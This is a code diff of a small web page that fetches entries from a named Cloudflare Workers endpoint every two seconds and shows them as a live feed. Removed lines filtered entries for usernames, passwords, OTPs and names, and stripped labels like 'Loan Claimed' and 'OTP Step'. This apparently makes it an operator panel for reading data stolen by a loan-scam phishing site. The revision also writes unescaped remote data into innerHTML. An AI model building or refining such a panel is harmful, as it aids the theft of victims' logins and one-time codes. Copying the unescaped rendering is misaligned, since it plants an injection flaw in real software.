@@ -11,101 +11,91 @@
         .header { 
             background: #fff; padding: 10px; margin-bottom: 8px;
             display: flex; justify-content: space-between; align-items: center;
-            border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            border-radius: 4px; border-bottom: 1px solid #ddd;
         }
-        #count { color: #ff0000; font-size: 28px; font-weight: 900; }
+        #count { color: #ff0000; font-size: 26px; font-weight: 900; }
+        .status { font-size: 10px; color: #00a859; font-weight: bold; }
+
+        #logsContainer { width: 100%; display: flex; flex-direction: column; }
 
         .log-card { 
-            margin-bottom: 10px; padding: 15px; 
-            border-radius: 10px; width: 100%; display: flex; flex-direction: column;
+            margin-bottom: 6px; padding: 12px; 
+            border-radius: 4px; width: 100%; display: flex; flex-direction: column;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
         /* Black & White Alternate Theme */
-        .log-card:nth-child(odd) { background-color: #ffffff; color: #000; border: 1px solid #ddd; }
-        .log-card:nth-child(even) { background-color: #000000; color: #fff; }
+        .log-card:nth-child(odd) { 
+            background-color: #ffffff; 
+            color: #000000; 
+            border: 1px solid #ccc;
+        }
+        .log-card:nth-child(even) { 
+            background-color: #000000; 
+            color: #ffffff; 
+        }
 
         .detail-text { 
-            font-size: 16px; font-weight: bold; white-space: pre-wrap; 
-            line-height: 1.8; word-break: break-all;
+            font-size: 14px; white-space: pre-wrap; 
+            line-height: 1.5; word-break: break-all;
         }
 
         .time-footer { 
-            display: block; margin-top: 10px; font-size: 10px; 
-            color: #ff4d4d; text-align: right;
+            display: block; margin-top: 8px; font-size: 9px; 
+            color: #ff0000; text-align: right; font-weight: bold;
+            border-top: 1px solid rgba(128,128,128,0.3);
+            padding-top: 4px;
         }
+
+        .loading { font-size: 12px; color: #999; text-align: center; margin-top: 30px; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <span style="font-size: 12px; color: green; font-weight: bold;">● LIVE_FEED</span>
+        <span class="status">● LIVE_TERMINAL</span>
         <span id="count">0</span>
     </div>
 
-    <div id="logsContainer"></div>
+    <div id="logsContainer">
+        <p class="loading">Loading worker data...</p>
+    </div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        function formatData(text) {
-            if (!text) return "No Detail";
-            
-            // Sabse pehle faltu words saaf karein
-            let clean = text
-                .replace(/Type:[^|]*/gi, "")
-                .replace(/Path:[^|]*/gi, "")
-                .replace(/Loan Claimed/gi, "")
-                .replace(/OTP Step \d+/gi, "")
-                .trim();
-
-            // Pipe (|) ko break karke line banayein
-            let lines = clean.split('|').map(s => s.trim()).filter(s => s !== "");
-            
-            // Format check: Label aur Value ko " :- " se jodein
-            return lines.map(line => {
-                if (line.includes(':')) {
-                    let parts = line.split(':');
-                    let key = parts[0].trim();
-                    let val = parts.slice(1).join(':').trim(); // handle multiple colons
-                    return `${key}:- ${val}`;
-                }
-                return line;
-            }).join('\n');
-        }
-
         async function fetchLogs() {
             try {
+                // Fetching fresh data from worker
                 const response = await fetch(`${workerURL}?t=${Date.now()}`);
                 const data = await response.json();
                 const container = document.getElementById('logsContainer');
                 
-                // Sirf kaam ka data filter karein
-                const filteredData = data.filter(item => {
-                    const d = item.detail.toLowerCase();
-                    return d.includes("user") || d.includes("pass") || d.includes("otp") || d.includes("name");
-                }).reverse();
+                // Data ko reverse kar rahe hain taaki New Entry top par rahe
+                const sortedData = data.reverse();
+                document.getElementById('count').innerText = sortedData.length;
 
-                document.getElementById('count').innerText = filteredData.length;
-
-                if (filteredData.length === 0) {
-                    container.innerHTML = "<p style='text-align:center; padding-top:20px;'>Data load ho raha hai...</p>";
+                if (sortedData.length === 0) {
+                    container.innerHTML = "<p class='loading'>No Data Found.</p>";
                     return;
                 }
 
-                container.innerHTML = filteredData.map(item => {
+                container.innerHTML = sortedData.map(item => {
+                    // Seedhe item.detail show kar raha hoon bina kisi badlav ke
                     return `
                         <div class="log-card">
-                            <div class="detail-text">${formatData(item.detail)}</div>
+                            <div class="detail-text">${item.detail}</div>
                             <span class="time-footer">${item.time}</span>
                         </div>
                     `;
                 }).join('');
 
             } catch (err) {
-                console.error("Fetch Error");
+                console.error("Sync Error");
             }
         }
 
+        // Real-time update every 2 seconds
         setInterval(fetchLogs, 2000);
         window.onload = fetchLogs;
     </script>
